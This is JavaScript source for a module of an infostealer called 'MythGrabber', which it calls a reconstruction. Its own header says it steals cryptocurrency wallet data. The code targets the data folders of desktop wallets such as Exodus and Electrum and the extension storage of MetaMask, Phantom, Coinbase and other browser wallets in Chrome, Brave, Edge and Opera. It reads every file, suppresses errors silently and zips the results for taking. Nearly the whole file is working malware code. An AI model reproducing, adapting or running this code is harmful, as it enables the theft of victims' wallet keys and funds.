/**
 * MythGrabber v140 - Wallet Stealer Module (Reconstructed)
 * 
 * This module steals cryptocurrency wallet data from various wallets.
 */

const fs = require('fs-extra');
const path = require('path');
const JSZip = require('jszip');

// Wallet paths
const WALLET_PATHS = {
    // Desktop Wallets
    exodus: {
        path: path.join(process.env.APPDATA, 'Exodus', 'exodus.wallet'),
        files: ['*']
    },
    atomic: {
        path: path.join(process.env.APPDATA, 'atomic', 'Local Storage', 'leveldb'),
        files: ['*']
    },
    electrum: {
        path: path.join(process.env.APPDATA, 'Electrum', 'wallets'),
        files: ['*']
    },
    jaxx: {
        path: path.join(process.env.APPDATA, 'com.liberty.jaxx', 'IndexedDB'),
        files: ['*']
    },
    coinomi: {
        path: path.join(process.env.LOCALAPPDATA, 'Coinomi', 'Coinomi', 'wallets'),
        files: ['*']
    },
    guarda: {
        path: path.join(process.env.APPDATA, 'Guarda', 'Local Storage', 'leveldb'),
        files: ['*']
    },
    
    // Browser Extension Wallets (stored in browser data)
    metamask: {
        browserExtension: true,
        extensionId: 'nkbihfbeogaeaoehlefnkodbefgpgknn'
    },
    phantom: {
        browserExtension: true,
        extensionId: 'bfnaelmomeimhlpmgjnjophhpkkoljpa'
    },
    ronin: {
        browserExtension: true,
        extensionId: 'fnjhmkhhmkbjkkabndcnnogagogbneec'
    },
    binance: {
        browserExtension: true,
        extensionId: 'fhbohimaelbohpjbbldcngcnapndodjp'
    },
    coinbase: {
        browserExtension: true,
        extensionId: 'hnfanknocfeofbddgcijnmhnfnkdnaad'
    }
};

// Browser extension paths
const BROWSER_EXTENSION_PATHS = {
    chrome: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings'),
    brave: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Extension Settings'),
    edge: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Extension Settings'),
    opera: path.join(process.env.APPDATA, 'Opera Software', 'Opera Stable', 'Local Extension Settings')
};

// Collect wallet files
async function collectWalletFiles(walletName, walletConfig) {
    const files = [];
    
    try {
        if (!fs.existsSync(walletConfig.path)) {
            return files;
        }
        
        const walkDir = (dir, baseDir = dir) => {
            const items = fs.readdirSync(dir);
            for (const item of items) {
                const fullPath = path.join(dir, item);
                const stat = fs.statSync(fullPath);
                
                if (stat.isDirectory()) {
                    walkDir(fullPath, baseDir);
                } else {
                    const relativePath = path.relative(baseDir, fullPath);
                    files.push({
                        name: relativePath,
                        path: fullPath,
                        content: fs.readFileSync(fullPath)
                    });
                }
            }
        };
        
        walkDir(walletConfig.path);
    } catch (error) {
        // Silent fail
    }
    
    return files;
}

// Collect browser extension wallet data
async function collectExtensionWallet(extensionId, extensionName) {
    const files = [];
    
    for (const [browserName, extensionBasePath] of Object.entries(BROWSER_EXTENSION_PATHS)) {
        try {
            const extensionPath = path.join(extensionBasePath, extensionId);
            
            if (!fs.existsSync(extensionPath)) continue;
            
            const walkDir = (dir, baseDir = dir) => {
                const items = fs.readdirSync(dir);
                for (const item of items) {
                    const fullPath = path.join(dir, item);
                    const stat = fs.statSync(fullPath);
                    
                    if (stat.isDirectory()) {
                        walkDir(fullPath, baseDir);
                    } else {
                        const relativePath = path.relative(baseDir, fullPath);
                        files.push({
                            name: `${browserName}/${extensionName}/${relativePath}`,
                            path: fullPath,
                            content: fs.readFileSync(fullPath)
                        });
                    }
                }
            };
            
            walkDir(extensionPath);
        } catch (error) {
            // Silent fail
        }
    }
    
    return files;
}

// Main wallet collection function
async function collectAllWallets() {
    const walletData = {
        desktopWallets: {},
        extensionWallets: {}
    };
    
    // Collect desktop wallets
    for (const [walletName, walletConfig] of Object.entries(WALLET_PATHS)) {
        if (walletConfig.browserExtension) continue;
        
        const files = await collectWalletFiles(walletName, walletConfig);
        if (files.length > 0) {
            walletData.desktopWallets[walletName] = files;
        }
    }
    
    // Collect browser extension wallets
    for (const [walletName, walletConfig] of Object.entries(WALLET_PATHS)) {
        if (!walletConfig.browserExtension) continue;
        
        const files = await collectExtensionWallet(walletConfig.extensionId, walletName);
        if (files.length > 0) {
            walletData.extensionWallets[walletName] = files;
        }
    }
    
    return walletData;
}

// Create wallet archive
async function createWalletArchive(walletData) {
    const zip = new JSZip();
    
    // Add desktop wallets
    for (const [walletName, files] of Object.entries(walletData.desktopWallets)) {
        const folder = zip.folder(`desktop/${walletName}`);
        for (const file of files) {
            folder.file(file.name, file.content);
        }
    }
    
    // Add extension wallets
    for (const [walletName, files] of Object.entries(walletData.extensionWallets)) {
        const folder = zip.folder(`extensions/${walletName}`);
        for (const file of files) {
            folder.file(file.name, file.content);
        }
    }
    
    return await zip.generateAsync({ type: 'nodebuffer' });
}

module.exports = {
    WALLET_PATHS,
    collectAllWallets,
    createWalletArchive
};
